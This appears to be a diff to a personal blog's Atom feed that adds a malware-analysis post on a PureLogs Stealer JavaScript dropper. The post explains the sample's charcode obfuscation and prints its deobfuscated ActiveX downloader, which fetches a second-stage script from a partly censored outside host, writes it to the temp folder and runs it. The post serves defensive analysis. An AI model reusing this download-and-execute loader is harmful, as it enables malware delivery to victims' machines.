@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator>
   <link href="http://localhost:4000/author/hanleyjames/feed.xml" rel="self" type="application/atom+xml" />
   <link href="http://localhost:4000/" rel="alternate" type="text/html" />
-  <updated>2024-05-05T11:42:11-06:00</updated>
+  <updated>2024-05-05T12:58:46-06:00</updated>
   <id>http://localhost:4000/author/hanleyjames/feed.xml</id>
 
   
@@ -30,6 +30,96 @@
   
   
 
+  
+    <entry>
+      <title type="html">PureLogs Stealer</title>
+      <link href="http://localhost:4000/PureLogStealer" rel="alternate" type="text/html" title="PureLogs Stealer" />
+      <published>2024-05-05T05:50:00-06:00</published>
+      <updated>2024-05-05T05:50:00-06:00</updated>
+      <id>http://localhost:4000/PureLogStealer</id>
+      <content type="html" xml:base="http://localhost:4000/PureLogStealer">&lt;p&gt;MalwareBazzar: 3eaae1b3f71898ceac37bd6a7779ed9e821d06a1004ff5f527922ae6c9066082&lt;/p&gt;
+
+&lt;h1 id=&quot;about&quot;&gt;About&lt;/h1&gt;
+
+&lt;p&gt;I don’t know much about the Purelogs family, but there is a blog from Any.Run by &lt;a href=&quot;https://any.run/cybersecurity-blog/pure-malware-family-analysis/&quot;&gt;khr0x, Jane &amp;amp; Maksim Mikhailov&lt;/a&gt; in more detail and better than I could probably do at this moment due to time. It’s worth reading so I would recommend checking it out. The file itself looks like the following:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/24-05-05-PureLogStealer-1.JPG&quot; alt=&quot;PureLogsStealer1&quot; title=&quot;PureLogs Stealer1&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-overview&quot;&gt;Initial Overview&lt;/h3&gt;
+
+&lt;p&gt;This relatively short file is pretty straightforward. At first glance, what seems to be happening is we’re building a string with the &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode&quot;&gt;stactic method&lt;/a&gt; on the String object.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    String.fromCharCode(...)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To make the code a bit clearer, we essentially have a really large string we’re building, and are hiding the UTF-16 character codes by taking a number, in this case the variable U1s (258393352); we’re then taking a larger number and subtracting it to get our UTF-16 character code.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/24-05-05-PureLogsStealer-2.JPG&quot; alt=&quot;PureLogsStealer2&quot; title=&quot;PureLogs Stealer2&quot; /&gt;
+&lt;img src=&quot;/assets/images/24-05-05-PureLogsStealer-3.jpg&quot; alt=&quot;PureLogsStealer3&quot; title=&quot;PureLogs Stealer3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It then follows that each of these builds a string that we’re going to &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval&quot;&gt;eval()&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;payload&quot;&gt;Payload&lt;/h3&gt;
+
+&lt;p&gt;The following string is the actual JS that is used to drop a secondary file and the payload itself. I have cleaned up some variable names and censored the domain name to prevent someone accidentally following the link.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    try{
+        var Object = new ActiveXObject(&apos;MSXML2.XMLHTTP&apos;)
+        Object.Open(&apos;GET&apos;,
+            &apos;https://postutopia.***/wp-includes/images/smilies/wp.js&apos;,
+            false
+        )
+        Object.Send()
+        var axo = new ActiveXObject(&apos;Scripting.FileSystemObject&apos;)
+        var filepath = axo.GetSpecialFolder(2) + &apos;/IDWYPJ.js&apos;
+
+        if (Object.Status == 200){
+            var Stream = new ActiveXObject(&apos;ADODB.Stream&apos;)
+            Stream.Open()
+            Stream.Type = 1
+            Stream.Write(Object.ResponseBody)
+            Stream.Position = 0
+            Stream.SaveToFile(filepath, 2)
+            Stream.Close()
+            var WshShell = new ActiveXObject(&apos;WScript.Shell&apos;)
+            var oRun = WshShell.Run(filepath)
+        }
+    } catch(e) {}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The file works by checking for the existence of this wp.js file stored. It then sends this get request and creates an ActiveXObject (axo), this is used to get the filepath to the temporary directory and the file we’re creating. If the GET request is successful we write the wp.js file and save it (if it already exists we overwrite it). Last we create one more ActiveXObject to run the dropped wp.js, now named IDWYPJ.js file. This new file then drops an EXE and creates a few files in the temp directory called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audio.exe&lt;/code&gt;, which looks to be an AsyncRAT.&lt;/p&gt;
+
+&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;This sample of malware was not particularly interesting in terms of JS and what it did to obscure its intent. It’s primary payload was only novel in the sense it that it used String.fromCharCode, but it was not so obscure, that it was hard to figure out immediately what was going on. It then delivered the main JS in this String of CharCodes that it calls eval on. To read more about the malware itself and its full lifecylce, you can &lt;a href=&quot;https://www.joesandbox.com/analysis/1430766/0/html&quot;&gt;follow that here&lt;/a&gt;. This was probably one of the easier samples I had an opportunity to mess around with.&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>James Hanley</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="Malware" />
+      
+        <category term="JS" />
+      
+
+      
+        <summary type="html">MalwareBazzar: 3eaae1b3f71898ceac37bd6a7779ed9e821d06a1004ff5f527922ae6c9066082</summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">JS Malware Obsfucation</title>
